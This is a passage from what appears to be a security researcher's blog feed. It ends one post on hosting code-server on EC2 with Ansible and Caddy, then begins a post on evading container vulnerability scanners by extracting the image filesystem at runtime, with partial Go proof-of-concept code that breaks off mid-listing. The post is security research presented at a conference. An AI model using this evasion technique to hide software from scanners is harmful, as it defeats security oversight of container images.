&lt;p&gt;The basic installation of Code server is pretty straight-forward. They provide a deb package, so we can just download and install that :-&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Install Code Server&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;get_url&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://github.com/coder/code-server/releases/download/v4.14.0/code-server_4.14.0_amd64.deb&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/tmp/code-server.deb&lt;/span&gt;

  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Install Code Server&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;apt&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;deb&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/tmp/code-server.deb&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;present&lt;/span&gt;
  
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;start code server&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;systemd&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;code-server@ubuntu&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;started&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;yes&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After that there’s a couple of configuration changes to make, first I wanted to move the port from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8080&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;18080&lt;/code&gt; as I’ll often use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8080&lt;/code&gt; for other things. Using Ansible’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lineinfile&lt;/code&gt; was a good way to do that, and pointing it at the default config file location in the user’s home directory. As we’re using an Ubuntu EC2 instance here, that’ll be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/ubuntu&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Change port to 18080 in the code-server config file&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;lineinfile&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/home/ubuntu/.config/code-server/config.yaml&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;regexp&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;^bind-addr:'&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;bind-addr:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;127.0.0.1:18080'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You might notice that we’re still listening on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; here, but we’ll get to making this accessible remotely in a bit!&lt;/p&gt;

&lt;p&gt;Next up we want to change the password from the default value, of course. Code Server has different &lt;a href=&quot;https://coder.com/docs/code-server/latest/guide#external-authentication&quot;&gt;authentication options&lt;/a&gt; available, but for this purpose, a static password (assuming it’s suitably strong) should be fine.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Change password to the value of code_password in the code-server config file&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;lineinfile&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/home/ubuntu/.config/code-server/config.yaml&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;regexp&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;^password:'&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;password:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{code_password}}'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This section just sets the password to whatever is held for the ansible var &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;code_password&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Lastly for this section, we want to re-start the server, so our configuration changes take effect.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;restart code server&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;systemd&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;code-server@ubuntu&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;restarted&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;yes&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;making-it-available-remotely---caddy&quot;&gt;Making it available remotely - Caddy!&lt;/h2&gt;

&lt;p&gt;I’ve mentioned before about &lt;a href=&quot;https://raesene.github.io/blog/2023/01/21/Fun-with-Caddy-SSRF-Testing/&quot;&gt;how cool Caddy is&lt;/a&gt; for a variety of reasons, and we can make use of it here to expose the Code server over TLS. As a pre-requisite, this section uses an Ansible galaxy role, which can be installed with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ansible-galaxy collection install maxhoesel.caddy&lt;/code&gt;. If you’re happy enough with SSH port-forwarding, that would be another option here.&lt;/p&gt;

&lt;p&gt;We want to change the configuration of Caddy so that it’ll provide a reverse proxy from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1:18080&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0.0.0.0:443&lt;/code&gt; and set-up TLS&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Setup the Caddy server&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;include_role&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; 
      &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;maxhoesel.caddy.caddy_server&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;vars&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;caddy_config_mode&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Caddyfile&quot;&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;caddy_caddyfile&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;:443 {&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;tls internal {&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;on_demand&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;reverse_proxy :18080&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;}&lt;/span&gt;
        
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Restart Caddy&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;systemd&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;caddy&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;restarted&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;yes&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;extra-credit---valid-tls-cert&quot;&gt;Extra Credit - Valid TLS cert&lt;/h2&gt;

&lt;p&gt;At this point you’ve got a configuration that’ll work, but the certificate won’t be trusted by the browser, which isn’t ideal (if only that you’ll need to click through a warning when you get to it). We can get TLS certificates issued on demand using &lt;a href=&quot;https://letsencrypt.org/&quot;&gt;Lets encrypt&lt;/a&gt; and Caddy which has a very neat trick of provisioning these on the fly, we just need a valid DNS record for the host.&lt;/p&gt;

&lt;p&gt;Of course you could do this manually after set-up, but it’d be neat to have it provisioned automatically. Here we just need a DNS provider that’s got an API and, ideally, Ansible integration. Fortunately the DNS provider I use &lt;a href=&quot;https://dnsimple.com&quot;&gt;DNSimple&lt;/a&gt; has both of these things!&lt;/p&gt;

&lt;p&gt;First up we need to register our DNS record. This process will vary depending on your provider but the general concepts will likely remain. You’ll need an API key for the provider and a domain to host at. The task below sets up a host called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;csw&lt;/code&gt; and a domain specified as the var &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dns_domain&lt;/code&gt; and sets the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; record to point to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inventory_hostname&lt;/code&gt; which should be the external IP address of the EC2 we’ve started.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Authenticate to DNSimple &amp;amp; Create Record&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;community.general.dnsimple&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;account_email&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dnsimple_account_email&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;account_api_token&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dnsimple_api_key&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dns_domain&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;# Change as needed&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;csw&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;solo&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;yes&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;360&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{inventory_hostname}}&quot;&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;present&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;delegate_to&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;register&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;dns_record&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we’ve got a valid DNS record, we just need to re-write the Caddyfile that we’re using so that Caddy will provision a cert for us on access. These tasks remove the old Caddyfile, add a new one specifying our host and domain and setting up TLS and then re-start Caddy.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;remove old Caddy Config&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/etc/caddy/Caddyfile&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;absent&lt;/span&gt;

  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Add caddyfile contents&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/etc/caddy/Caddyfile&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;csw.{{dns_domain}}:443 {&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;tls {{dnsimple_account_email}}&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;reverse_proxy :18080&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Restart Caddy&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;systemd&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;caddy&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;restarted&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;yes&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If all works, once you’ve run your playbook, it should look something like this :-&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/csw-vscode.png&quot; alt=&quot;VS Code in browser&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;At the end of all this you should have a nice Web hosted development/testing environment with a terminal and port-forwarding, which could be handy for a number of reasons.&lt;/p&gt;
</description>
				<pubDate>Sun, 16 Jul 2023 10:27:00 +0100</pubDate>
				<link>https://raesene.github.io/blog/2023/07/16/code-server-on-EC2/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2023/07/16/code-server-on-EC2/</guid>
			</item>
		
			<item>
				<title>Fun with container images - Bypassing vulnerability scanners</title>
				<description>&lt;p&gt;At Last week’s &lt;a href=&quot;https://events.linuxfoundation.org/kubecon-cloudnativecon-europe/&quot;&gt;Kubecon EU&lt;/a&gt; I was fortunate enough to be on stage with &lt;a href=&quot;https://twitter.com/IanColdwater&quot;&gt;Ian Coldwater&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/bradgeesaman&quot;&gt;Brad Geesaman&lt;/a&gt;, and &lt;a href=&quot;https://twitter.com/mauilion&quot;&gt;Duffie Cooley&lt;/a&gt; presenting a talk called “&lt;a href=&quot;https://sched.co/1Hybu&quot;&gt;Malicious Compliance: Reflections on Trusting Container Scanners&lt;/a&gt;”.&lt;/p&gt;

&lt;p&gt;In this talk, one of the things we looked at was how it would be possible for a malicious container image to bypass container vulnerability scanners. We built up a set of techniques to demonstrate how this worked, with the details hosted on &lt;a href=&quot;https://github.com/bgeesaman/malicious-compliance&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;As with any talk we came up with quite a few ideas that we couldn’t fit in, for time, so I wanted to quickly talk about one I came up with as it’s a quick (and somewhat silly) way to bypass container vulnerability scanners.&lt;/p&gt;

&lt;h2 id=&quot;what-do-container-vulnerability-scanners-look-for&quot;&gt;What do container vulnerability scanners look for?&lt;/h2&gt;

&lt;p&gt;As we talked about during the presentation, there are a number of files and directories that contain information used by vulnerability scanners and SBOM tools to identify what software is installed in a container image, and what vulnerabilities are present in that software.&lt;/p&gt;

&lt;p&gt;So obviously anything which stops the scanner look at those locations could interfere with their operation.  With that idea in mind, I was thinking of some ways to do this, and I came up with a simple one.&lt;/p&gt;

&lt;h2 id=&quot;runtime-image-extraction&quot;&gt;Runtime image extraction&lt;/h2&gt;

&lt;p&gt;If we have a container image which only creates the container filesystem at runtime then scanners (which operate statically on images, rather than executing them) won’t be able to see that filesystem, and will likely just return an empty set of results.&lt;/p&gt;

&lt;p&gt;The way I came up with to do this was a simple golang program which takes a tarball and a command as arguments, then extracts the tarball and executes the command.&lt;/p&gt;

&lt;p&gt;Before I talk about the code, I’ll make it clear this is purely a PoC it’s not something anyone should use in production!&lt;/p&gt;

&lt;p&gt;The basic code looks like this :-&lt;/p&gt;

&lt;div class=&quot;language-golang highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;s&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
	&lt;span class=&quot;s&quot;&gt;&quot;os&quot;&lt;/span&gt;
	&lt;span class=&quot;s&quot;&gt;&quot;os/exec&quot;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;archiver&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;github.com/mholt/archiver/v3&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;c&quot;&gt;// Check if the correct number of arguments are provided&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Usage: go run main.go &amp;lt;tar_file&amp;gt; &amp;lt;file to execute&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;tarFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;c&quot;&gt;//password := os.Args[2]&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;destination&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;.&quot;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;archiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;MkdirAll&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;               &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ContinueOnError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;        &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;OverwriteExisting&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;      &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ImplicitTopLevelFolder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

